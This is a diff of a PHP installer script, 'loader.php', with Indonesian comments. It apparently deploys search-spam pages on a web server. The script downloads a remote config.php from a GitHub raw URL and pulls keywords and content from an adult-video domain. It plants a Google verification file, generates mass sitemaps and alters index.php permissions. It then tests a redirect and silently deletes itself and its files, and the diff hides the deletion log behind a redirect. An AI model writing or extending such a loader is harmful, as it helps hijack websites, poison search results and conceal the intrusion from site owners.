@@ -9,12 +9,13 @@ $server_path = dirname(__FILE__);
 // Logika domain
 $host = $_SERVER['HTTP_HOST'] ?? 'default-domain.com';
 $clean_host = str_replace('www.', '', $host);
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+$full_domain_url = $protocol . $host; // Domain lengkap DENGAN www jika ada
 
 // URL Download
-// PENTING: Pastikan URL ini mengarah ke config.php ANDA yang sudah dimodifikasi
 $config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php'; 
 $google_html_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html'; 
-$keyword_url = 'https://player.javpornsub.net/keyword/default.txt'; // URL Keyword OTOMATIS
+$keyword_url = 'https://player.javpornsub.net/keyword/default.txt'; 
 $base_content_url_path = 'https://player.javpornsub.net/content/';
 
 // Path Penyimpanan
@@ -86,11 +87,11 @@ function buat_robots_txt($domain) {
  * TAHAP 2: Dijalankan setelah form disubmit
  */
 function jalankan_instalasi() {
-    global $clean_host, $host, $server_path, $self_script_name,
+    global $clean_host, $full_domain_url, $server_path, $self_script_name,
            $config_url, $local_config_path, $keyword_url, $base_content_url_path,
            $local_sitemap_path, $local_json_content_path;
 
-    // 1. Ambil input dari form (HANYA JSON)
+    // 1. Ambil input dari form
     if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
         header('Location: ' . $self_script_name);
         exit;
@@ -152,7 +153,6 @@ function jalankan_instalasi() {
     }
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Ditemukan ' . count($keywords) . ' keywords. Mulai membuat sitemap...'];
     $total_keywords = count($keywords);
-    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
     $base_url = $protocol . $clean_host;
     $now = date('Y-m-d\TH:i:s+07:00');
     $urls_per_map = 10000;
@@ -192,9 +192,8 @@ function jalankan_instalasi() {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengubah permission index.php. Lakukan manual.'];
     }
 
-    // 7. Lanjut ke TAHAP 3 (Prompt Salin Domain)
-    $full_domain_url = $protocol . $host; // Menggunakan host asli (dengan www jika ada)
-    tampilkan_prompt_salin_domain($logs, $full_domain_url);
+    // 7. Lanjut ke TAHAP 3 (Prompt Cek Redirect & Salin)
+    tampilkan_prompt_cek_redirect($logs, $full_domain_url);
 }
 
 /**
@@ -321,17 +320,23 @@ function tampilkan_halaman_installer() {
 }
 
 /**
- * TAHAP 3: Tampilkan log instalasi, tunggu Enter untuk SALIN
+ * TAHAP 3: Tampilkan log instalasi, tunggu Enter untuk Cek Redirect & Salin
  */
-function tampilkan_prompt_salin_domain($logs, $full_domain_url) {
+function tampilkan_prompt_cek_redirect($logs, $full_domain_url) {
     global $self_script_name;
-    // Tambahkan log baru untuk prompt SALIN
+    // URL untuk tes redirect
+    $test_url = $full_domain_url . '/index.php?id=wanz-895-english-subtitle';
+    
+    // Tambahkan log baru untuk prompt SALIN & CEK
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain Anda: ' . htmlspecialchars($full_domain_url)];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk MENYALIN domain dan lanjut ke tahap hapus...'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk:'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '1. Membuka Tab Baru (Cek Redirect)'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '2. Menyalin Domain ke Clipboard'];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '3. Lanjut ke tahap Hapus File...'];
 
-    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Salin Domain</title>
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Cek Redirect & Salin Domain</title>
     <style>
-        /* (CSS Terminal sama seperti sebelumnya, disembunyikan agar ringkas) */
+        /* (CSS Terminal sama seperti sebelumnya) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
         .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
@@ -353,7 +358,7 @@ function tampilkan_prompt_salin_domain($logs, $full_domain_url) {
         <div class="terminal">
             <div class="terminal-header">
                 <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">loader.php (Tahap 3 - Salin Domain)</div>
+                <div style="color: #666; font-size: 10px;">loader.php (Tahap 3 - Cek & Salin)</div>
             </div>
             <div class="terminal-content" id="terminalContent">
                 <div id="logsContainer"></div>
@@ -372,13 +377,18 @@ function tampilkan_prompt_salin_domain($logs, $full_domain_url) {
                 document.addEventListener("keydown", function(e) {
                     if (e.key === "Enter") {
                         e.preventDefault(); 
-                        // 1. Coba Salin
+                        
+                        // 1. Buka Tab Baru (Cek Redirect)
+                        window.open(\'' . $test_url . '\', \'_blank\');
+                        
+                        // 2. Coba Salin
                         try {
                             navigator.clipboard.writeText(\'' . $full_domain_url . '\');
                         } catch (err) {
                             // Gagal tidak apa-apa, lanjut
                         }
-                        // 2. Lanjut ke TAHAP 4 (Konfirmasi Hapus)
+                        
+                        // 3. Lanjut ke TAHAP 4 (Konfirmasi Hapus)
                         window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
                     }
                 }, { once: true }); 
@@ -426,7 +436,7 @@ function tampilkan_prompt_hapus() {
 
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Konfirmasi Hapus</title>
     <style>
-        /* (CSS Terminal sama seperti sebelumnya, disembunyikan agar ringkas) */
+        /* (CSS Terminal sama seperti sebelumnya) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
         .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
@@ -505,7 +515,7 @@ function tampilkan_prompt_hapus() {
  * TAHAP 5: Hapus file dan hapus diri sendiri
  */
 function jalankan_penghapusan_terakhir() {
-    global $server_path, $self_script_name;
+    global $server_path, $self_script_name, $full_domain_url;
     
     // Daftar file yang akan dihapus
     $files_to_delete = [
@@ -513,26 +523,35 @@ function jalankan_penghapusan_terakhir() {
         'google8f39414e57a5615a.html'
     ];
 
-    $log_hapus = "Proses pembersihan...\n";
+    // --- PERMINTAAN 3: Redirect ke domain root ---
+    // Kirim JavaScript redirect ke browser SEBELUM menghapus file
+    echo "<!DOCTYPE html><html><head><title>Pembersihan Selesai</title></head><body>";
+    echo "<p>Pembersihan selesai. Mengalihkan ke halaman utama...</p>";
+    echo "<script>window.location.href = '" . $full_domain_url . "';</script>";
+    echo "</body></html>";
+    // --- Akhir Permintaan 3 ---
 
+    // Lanjutkan proses penghapusan di server
+    // (Pesan log ini tidak akan terlihat oleh user karena browser sudah dialihkan)
+    
+    // Pastikan output terkirim ke browser sebelum lanjut
+    if (function_exists('fastcgi_finish_request')) {
+        fastcgi_finish_request();
+    } else {
+        @ob_flush();
+        @flush();
+    }
+
+    // Hapus file-file installer
     foreach ($files_to_delete as $filename) {
         $file_path = $server_path . '/' . $filename;
         if (file_exists($file_path)) {
-            if (@unlink($file_path)) {
-                $log_hapus .= "Dihapus: $filename\n";
-            } else {
-                $log_hapus .= "Gagal Hapus: $filename\n";
-            }
+            @unlink($file_path);
         }
     }
 
-    $log_hapus .= "Menghapus installer...\n";
-    $log_hapus .= "SELESAI. Server Anda sudah bersih.";
-
     // Hapus diri sendiri
     @unlink(__FILE__);
-    
-    echo "<pre>$log_hapus</pre>";
 }
 
 /**
@@ -541,7 +560,7 @@ function jalankan_penghapusan_terakhir() {
 function tampilkan_log_terminal($logs, $next_action = 'done') {
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
     <style>
-        /* (CSS Terminal sama seperti sebelumnya, disembunyikan agar ringkas) */
+        /* (CSS Terminal sama seperti sebelumnya) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
         .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
